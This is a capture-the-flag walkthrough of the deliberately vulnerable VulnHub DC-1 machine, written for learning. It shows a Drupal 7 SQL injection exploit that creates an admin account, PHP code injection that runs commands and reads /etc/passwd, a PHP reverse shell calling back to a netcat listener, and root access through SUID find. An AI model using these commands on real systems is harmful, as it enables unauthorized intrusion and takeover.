# DC-1 of the DC Series


Let's root DC-1!

<br>

Details can be found at [https://www.five86.com/dc-1.html](https://www.five86.com/dc-1.html)

<span style="color:cyan">
<details closed>
<summary> Open this to see the box's overview pulled from the above website.
</summary>
<br>
DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.

To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.

There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.

There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory. You don't even need to be root to do this, however, you will require root privileges.

Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.

Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.
</details>
</span>
<br>

> If you're ever needing to find the IP of a local box, `sudo netdiscover -r *ip/cidr*` will do the trick. `-r` specifies the range. If this tool doesn't work, you could have routing issues. `-i` can specify the interface you need to run against. Another nifty tool is `ip route get *ip*` as this will tell you what route a packet will take to the `ip` specified. Anyways.. to the box!

## Export Environment Variables

Exporting variables can help speed up some tasks, e.g., insert IP address into a command or when we fuzz directories and files of a webapp address.
Your IP value will most likely differ, so adjust accordingly:
1. `export IP="192.168.56.110"`
2. `export URLdir="http://192.168.56.110/FUZZ/"` <-- Directories
3. `export URLfile="http://192.168.56.110/FUZZ"` <-- Files
   1. appended backslash depicts directories vs files :smiley:
4. You can then test your exported vars by running `echo $varname`: e.g., `echo $IP` would respond with 192.168.56.110.

## Scanning & Enumeration

Before we move forward, let's make a list that'll include the important bits as we move forward. We'll add/update as we go through the box, so we can reference it.

> Box Name: DC-1  
> IP: 192.168.56.110 

### nmap

Let's start with a simple nmap scan to see what we're playing with:

- `nmap $IP -T4 -p- -A --open`
  - `$IP` = target's IP via exported variable.
  - `-T4` = T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at [Nmap's Timing Templates](https://nmap.org/book/performance-timing-templates.html) webpage.
  - `-p-` = Tells nmap to scan all ports(TCP by default)..
  - `-A` = Runs four options under one:
      1. OS detection
      2. Version detection
      3. Script scanning
      4. Traceroute
  - `--open` = runs `-A` only against ports that are open. Idea is to speed up slow scans. Running a local box won't cause much issues but when you're running a slower scan or the latency is high, this option can help.

![DC-1 nmap scan](/images/CTF/VulnHub/DC-Series/DC-1/DC-1_nmap-scan.png "DC-1 nmap scan") 

- Let's start with port 80 as it's most likely the weakest entry point due to the potential services listed in robots.txt.
- SSH, on port 22, isn't much use as we currently lack keys, usernames, and passwords. We could brute force but it'll take a while and it's not guaranteed to work.
- rpc could be of use but I'm not seeing anything obvious in the list of services, so we'll skip this for now.

  > **Box Name:** DC-1  
  > **IP:** 192.168.56.110  
  > **OS:** Debian(Linux)  
  > **Ports & Service:**  
  > ***80*** - Apache httpd 2.2.22- Drupal CMS v7.xx - **<-- Focus here first**  
  > ***111*** - rpcbind  
  > ***43450*** - rpcbind related  
  > ***22*** - ssh - least attractive since we have no usernames, passwords, or keys  

### Manual Inspection of 80/webapp

- Open up a browser and enter the box's IP address to visit the IP's http service. Since it's running on port 80, there's no need to specify the port eg. 192.168.56.110 **:80**

![DC-1 http service](/images/CTF/VulnHub/DC-Series/DC-1/Drupal-http.png "DC-1 http service")

- Manually inspect the page source. Findings are:
  - Drupal 7 = nmap already told us this
  ![Page Source of Drupal](/images/CTF/VulnHub/DC-Series/DC-1/page-source-drupal-7.png "Page Source of Drupal")

- Let's see if we can enumerate the responses regarding the login fields at the /user/ directory
  - No response allows us to differentiate between username nor passwords.   
  If we could get a response saying "This email does not exist", then that would allow us to brute force enumerate emails.
  ![Login Enum Fail](/images/CTF/VulnHub/DC-Series/DC-1/login-enum-fail.png "Login Enum Fail")

  - Same goes for recovering an account.
  ![Forgot Enum Fail](/images/CTF/VulnHub/DC-Series/DC-1/forgot-enum-fail.png "Forgot Enum Fail")

- Default credentials?
  - Seems like that's a negative. Drupal forces a password change when logging in for the first time. Answer found via google :smiley:

- /robots.txt shows possible services running. Possibility for injections? PHP, SQL? Worth noting.
  - sqlite
  - mysql
  - php

- POST responses show the Apache/2.2.22 (Debian) versioning, which nmap already found.
- POST also shows PHP/5.4.45-0+deb7u14. nmap didn't see this.

  > **Box Name:** DC-1  
  > **IP:** 192.168.56.110  
  > **OS:** Debian(Linux)  
  > **Ports & Service:**  
  > ***80*** - Apache httpd 2.2.22 - Drupal CMS v7.xx - php 5.4.45-0+deb7u14 - sql ?  
  > ***111*** - rpcbind  
  > ***43450*** - rpcbind related  
  > ***22*** - ssh - least attractive since we have no usernames, passwords, or keys  

  ### Fuzzing webapp/80

- I tried fuzzing but it didn't result in anything interesting beyond what robots.txt already told us.
  - Example commands would be...
    - `wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLfile`
    - `wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLdir`
  - I also tried dirbuster with similar results.
  - Some results I got were:
    - 000000007:   200        54 L     164 W      3151 Ch     "install.php"
    - 000000005:   200        0 L      6 W        42 Ch       "xmlrpc.php"
    - 000000237:   200        9 L      15 W       283 Ch      "rss.xml"

## Researching Vulnerabilities

I was hoping to find something more than just a general version 7 of Drupal... e.g., 7.26, but that's okay. Let's go ahead and run `searchsploit` against `Drupal` and see what we get back.

- `searchsploit Drupal`
![DC-1 Drupal 7 searchsploit](/images/CTF/VulnHub/DC-Series/DC-1/searchsploit-drupal.png "DC-1 Drupal 7 searchsploit")
- Well, good news is there isn't many version 7 exploits!
- We're looking for RCE(remote code execution) as it will provide us the quickest/easiest way into the system. We also want something that doesn't require authentication, although we can make a user at /user/register. There's always the chance a non-privileged user would have enough privs to execute such an exploit.

- The Drupalgeddon2 sticks out to me but I want a more manual approach and something that'll be sure to work with version 7.xx ... Let's go with the **php/webapps/34992.py**. ***We could use msfconsole and let that automate most of what we'll do below, but what's the fun in that!***
> My thought process is that we'll create an admin account in drupal and see what drupal has to offer. We saw PHP and SQL in robots.txt, so we'll most likely have a way in through those. Speaking of SQL, 34992.py script will be using SQLi, so that's a start...

- Download the script to a local directory and `cat` the contents...
  - `searchsploit -m php/webapps/34992.py`  <-- This will download the script to the current directory using searchsploit. Love this feature.
  - `cat 34992.py` <-- This will output the contents of the .py script, so we can dig into it and alter code if needed. Many scripts don't hold your hand, so knowing how to read code is very helpful.
  - You'll see this line which tells us the command options needed, so we can successfully execute the script against the target.

![DC-1 Drupal 7 exploit](/images/CTF/VulnHub/DC-Series/DC-1/python-exploit-admin-sqli.png "DC-1 Drupal 7 exploit")

usage: `%prog **-t http[s]://TARGET_URL -u USER -p PASS**\n`

So we'll try... `python2 34992.py -t http://$IP -u owned -p owned`
- This will hopefully create an admin account we can login to via the homepage of Drupal. From there the goal is to look for a way to upload a malicious php file. eg a reverse shell or possibly a plugin to exploit. Who knows. I'm just guessing but since this is a CMS(Drupal) and most likely running PHP, I bet our chances are good.

## Exploitation

Well... let's get to it.

- `python2 34992.py -t http://$IP -u owned -p owned`

**IF YOU GET A "SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?"...  
you're not running the script under python2... which is required.**

![DC-1 Drupal 7 admin created](/images/CTF/VulnHub/DC-Series/DC-1/drupal-admin-created.png "DC-1 Drupal 7 admin created")

- Now let's test the login page... with owned:owned.
  ***ADMIN LOGGED IN***
  ![DC-1 Drupal 7 admin logged in](/images/CTF/VulnHub/DC-Series/DC-1/logged-in-drupal.png "DC-1 Drupal 7 admin logged in")

- Now that we're in a CMS, we should look around and enumerate what we can...

### Enumerating Drupal admin pages

It's important to gather as much information as you can as it might come into handy later on... so let's see what we can find inside Drupal as admin.
- Username ***Fred*** found
- Username ***admin*** found
  - So brute forcing may have been an option but maybe it has lockout?
- flag3 is found under content...
  - **Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.**
  - This seems to hint to maybe the find command allowing us access to certain files we shouldn't have access to? Sticky bit? Worth checking once we're in...
- Let's look in the module tab and see if there's anything php related...
  - I found and enabled the follow module... "PHP filter". It may just allow us to upload malicious PHP code.

![DC-1 Drupal 7 Enabled PHP Filter](/images/CTF/VulnHub/DC-Series/DC-1/php-module-enable-it.png "DC-1 Drupal 7 Enabled PHP Filter")

  - Not that it's enabled, we should see if we can give it administrator rights.. Click the "Permissions" and then check the "administrator" user box for "Use the PHP code text format"

![DC-1 Drupal 7 PHP code permissions](/images/CTF/VulnHub/DC-Series/DC-1/php-permissions.png "DC-1 Drupal 7 PHP code permissions")


![DC-1 Drupal 7 admin perms for php code](/images/CTF/VulnHub/DC-Series/DC-1/enable-php-code-admin.png "DC-1 Drupal 7 admin perms for php code")

- I'm hoping by checking the admin box, this will allow any code inputted to be executed with admin privs.

### Exploiting PHP module

- Now that it's enabled, lets see if we can create a PHP page under content. Maybe we can inject php code, like the php revshell by pentestmonkey! Or we may be able to grab the /etc/passwd file to see what users are on the box. Even better /etc/shadow file..., if we have root privs.. doubtful.
  - Content > Add Content > Basic Page
    - Title = Whatever you want
    - Body is where we'll test the injection...
      - `<?php system("whoami"); ?>`
    - Change "Text Format" to the PHP code module, which is what we enabled with admin privs
      - Then press preview... let's see if we can grab the current user...
        - We got a response! "www-data". Injection is working!
        ![DC-1 Drupal 7 PHP code injection!](/images/CTF/VulnHub/DC-Series/DC-1/www-data-injection.png "DC-1 Drupal 7 PHP code injection!")
      
      - Let's change the command from `whoami` to `cat /etc/passwd`. Looks like another two users to notate. www-data and flag4
      ![C-1 Drupal 7 PHP code injection - passwd file](/images/CTF/VulnHub/DC-Series/DC-1/php-injection-passwd.png "C-1 Drupal 7 PHP code injection - passwd file")
      - Trying `sudo cat /etc/shadow` fails, so we don't have sudo or root privs. *Sudo may not even be installed*

### PHP revshell  
- Now it's time to get ourselves a revshell through php injection... let's insert the following php code from this raw github file...
  - [PentestMonkey's PHP revshell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
  - You'll want to modify the following lines of code to match up with your `nc -nvlp 1234` command. The PHP code will callback to netcat and allow us to connect via a shell on the DC-1 box. *You can change the ports to whatever you'd like*.
    - $ip = '192.168.56.1';  // CHANGE THIS
    - $port = 1234;       // CHANGE THIS

  - Now open up another terminal with the `nc -nvlp 1234`, I mentioned before.
    - You should now have both:
      1. terminal with `nc -nvlp 1234` running.
      2. Drupal Basic Page filled in with PentestMonkey's reverse php shell
  - Let's hit preview and we should get a revshell as www-data. If we do, we'll move onto privilege escalation.
    - The Drupal page will likely hang, let it be. Minimize it and forget about it. If you refresh or close it, you'll lose your revshell.
- We now have a revshell into the box but lacks tty! We'll fix this in the next section.
  - Let's do a quick test by typing `whoami` into our new revshell. You should see "www-data".
  ![DC-1 Drupal 7 - revshell w/o tty](/images/CTF/VulnHub/DC-Series/DC-1/no-tty.png "DC-1 Drupal 7 - revshell w/o tty")

## Privilege Escalation

At this point, we now have a revshell into DC-1 whom does not have root privs. We'll need to find a way to escalate the privs, so we can 'own' the box!

### Custom tty
- First thing I like to do is get a tty and make our local terminal not break connection even if you press CTRL+C.
  - `python -c 'import pty; pty.spawn("/bin/bash")'`
  - `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp`
  - `export TERM=xterm-256color`
  - `alias ll='ls -lsaht --color=auto'`
  - Press Ctrl + Z to make it a background process
  - `stty raw -echo;fg;reset`
  - `stty columns 200 rows 200`
- Now that you have a tty shell, with alias ll, and you can't CTRL+C out of it on accident.. Let's get to privesc(privilege escalation) but before that let's update our 'notes'
<br>
  > **Box Name:** DC-1  
  > **IP:** 192.168.56.110  
  > **OS:** Debian(Linux)  
  > **Ports & Service:**  
  > ***80*** - Apache httpd 2.2.22 - Drupal CMS v7.24 - php 5.4.45-0+deb7u14 - mysql version?  
  >  > ***Drupal*** -> Admin acct created owned:owned with Drupal 7.x SQLi exploit -> enabled php-code and created basic content to inject php-revshell giving us low-level shell. -> shifted into a tty that doesn't allow CTRL+C disconnects -> now time to dig into privesc  
  >  
  > ***111*** - rpcbind   
  > ***43450*** - rpcbind related  
  > ***22*** - ssh - least attractive since we have no usernames, passwords, or keys  
  >  
  > Found Users: Fred ; admin ; www-data ; flag4  

  At this point, we want to look through the box and enumerate anything we can find. For time sake, we'll skip most of this.
  We could transfer linpeas.sh to enumerate the system for us, but let's try without it.
  - I like to look for binaries that have SUID or GUID perms.
    - These SUIDs and GUIDs are binaries that have a perm set to `s` in the user or group column. What makes these binaries so attractive is that they are executed with the owner's privs(think root :smiley:) but can be accessible and executable by lower priv users/groups.
    - Once we produce a list of SUID/GUID binaries, we can check them against [GTFObins](https://gtfobins.github.io)  
  
  ### SUID Search
  Let's look for SUID binaries!
    - `find / -perm -u=s -type f 2>/dev/null`
![DC-1 Drupal 7 - SUID search](/images/CTF/VulnHub/DC-Series/DC-1/SUID-binaries.png "DC-1 Drupal 7 - SUID search")
    - Here's the `find` binary. Look at the perms. You're looking for an `s` in place of the executable bit set for user group.
![DC-1 Drupal 7 - SUID example](/images/CTF/VulnHub/DC-Series/DC-1/find-SUID-bit.png "DC-1 Drupal 7 - SUID example")

  ### Searching GTFObins    
     Let's look on [GTFObins](https://gtfobins.github.io) to see if any of these binaries have a SUID exploit that obtains and holds elevated privs.  
      - /bin/mount - only has Sudo which isn't installed on the box. So, pass.
      - /bin/ping - no SUID abuse  
      - /bin/su - no SUID abuse  
      - /bin/ping6 - isn't listed  
      - /bin/umount - isn't listed  
      - /usr/bin/at - no SUID abuse  
      - /usr/bin/chsh - isn't listed  
      - /usr/bin/passwd - isn't listed  
      - /usr/bin/newgrp - isn't listed  
      - /usr/bin/chfn - isn't listed  
      - /usr/bin/gpasswd - isn't listed  
      - /usr/bin/procmail - isn't listed  
      - /usr/bin/find - WE HAVE A HIT! SUID bit can be abused!  
        - command will be `/usr/bin/find -exec /bin/sh \; -quit`  

  ### Abusing the SUID
    - Copy/paste `/usr/bin/find -exec /bin/sh \; -quit` in the tty remote shell you have running in your terminal and let's see if we can abuse the SUID bit to escalate privs to root...
    - $$$ - We have root!
## ROOTED!
![DC-1 Drupal 7 - ROOTED!!!](/images/CTF/VulnHub/DC-Series/DC-1/box-pwned.png "DC-1 Drupal 7 - ROOTED!!!")



---

> Author: revsh3ll  
> URL: https://PivotTheNet.GitHub.io/dc-1/  

